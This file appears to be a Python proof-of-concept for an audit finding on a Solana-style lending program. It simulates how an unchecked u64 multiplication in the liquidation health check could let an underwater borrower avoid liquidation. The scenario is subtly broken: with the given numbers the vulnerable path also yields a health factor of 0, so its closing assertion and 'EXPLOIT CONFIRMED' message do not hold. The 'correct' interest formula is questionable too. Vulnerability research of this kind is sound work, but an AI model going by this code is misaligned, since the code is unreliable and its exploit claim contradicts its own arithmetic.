"""Exploit PoC: Integer overflow in liquidation interest calc (SEM-003).

Demonstrates that the multiplication borrowed * interest_rate * total_borrows
can overflow u64, wrapping to a small number and making unhealthy positions
appear healthy — preventing liquidation.
"""
from dataclasses import dataclass
import ctypes


@dataclass
class Pool:
    """Simulates the on-chain Pool account."""
    total_deposits: int = 0
    total_borrows: int = 0
    interest_rate: int = 500  # 5% in basis points


@dataclass
class UserAccount:
    """Simulates the on-chain UserAccount."""
    deposited: int = 0
    borrowed: int = 0


# Simulate Rust u64 overflow behavior
U64_MAX = (1 << 64) - 1


def u64_mul(a: int, b: int) -> int:
    """Simulates unchecked u64 multiplication (wrapping on overflow)."""
    return (a * b) & U64_MAX


def liquidate_vulnerable(pool: Pool, user: UserAccount) -> dict:
    """Simulates the VULNERABLE liquidate instruction.

    BUG: Unchecked multiplication can overflow, making interest ~0.
    """
    # This is the vulnerable calculation
    interest = u64_mul(u64_mul(user.borrowed, pool.interest_rate), pool.total_borrows)
    denominator = (user.borrowed + interest) & U64_MAX

    if denominator == 0:
        return {"error": "division by zero", "health": None}

    health = (user.deposited * 100) // denominator
    return {"interest": interest, "health": health, "can_liquidate": health < 75}


def liquidate_correct(pool: Pool, user: UserAccount) -> dict:
    """What the CORRECT liquidation check should look like."""
    # Using Python arbitrary precision (no overflow)
    interest = user.borrowed * pool.interest_rate * pool.total_borrows
    denominator = user.borrowed + interest
    if denominator == 0:
        return {"error": "division by zero", "health": None}
    health = (user.deposited * 100) // denominator
    return {"interest": interest, "health": health, "can_liquidate": health < 75}


def main():
    print("=" * 60)
    print("EXPLOIT: Integer Overflow Prevents Liquidation")
    print("=" * 60)

    # Set up a scenario where overflow occurs
    pool = Pool(
        total_borrows=10_000_000_000_000,  # 10 trillion lamports in total borrows
        interest_rate=500,
    )

    underwater_user = UserAccount(
        deposited=1_000_000,       # 0.001 SOL deposited
        borrowed=100_000_000_000,  # 100 SOL borrowed — clearly underwater
    )

    print("\nScenario: User borrowed 100 SOL with only 0.001 SOL collateral")
    print(f"  deposited:     {underwater_user.deposited} lamports")
    print(f"  borrowed:      {underwater_user.borrowed} lamports")
    print(f"  pool borrows:  {pool.total_borrows} lamports")
    print(f"  interest rate: {pool.interest_rate} bps")

    # Step 1: Show what the correct calculation gives
    print("\nStep 1: Correct calculation (no overflow)")
    correct = liquidate_correct(pool, underwater_user)
    print(f"  interest:      {correct['interest']}")
    print(f"  health factor: {correct['health']}")
    print(f"  can liquidate: {correct['can_liquidate']}")

    # Step 2: Show what the vulnerable calculation gives
    print("\nStep 2: Vulnerable calculation (u64 overflow)")
    vuln = liquidate_vulnerable(pool, underwater_user)
    print(f"  interest:      {vuln['interest']} (overflowed!)")
    print(f"  health factor: {vuln['health']}")
    print(f"  can liquidate: {vuln['can_liquidate']}")

    # Step 3: Demonstrate the discrepancy
    print("\n" + "=" * 60)
    print("EXPLOIT RESULT:")
    print(f"  Correct health factor:    {correct['health']} (should be liquidatable)")
    print(f"  Vulnerable health factor: {vuln['health']} (overflow prevents liquidation)")

    # The vulnerable calculation should show the position as healthy
    # when it's actually deeply underwater
    assert correct['can_liquidate'], "Correct calc says: CAN liquidate"
    assert not vuln['can_liquidate'], "Vulnerable calc says: CANNOT liquidate (overflow)"
    print("\n  >>> EXPLOIT CONFIRMED: Overflow prevents liquidation of underwater position <<<")
    print("=" * 60)


if __name__ == "__main__":
    main()
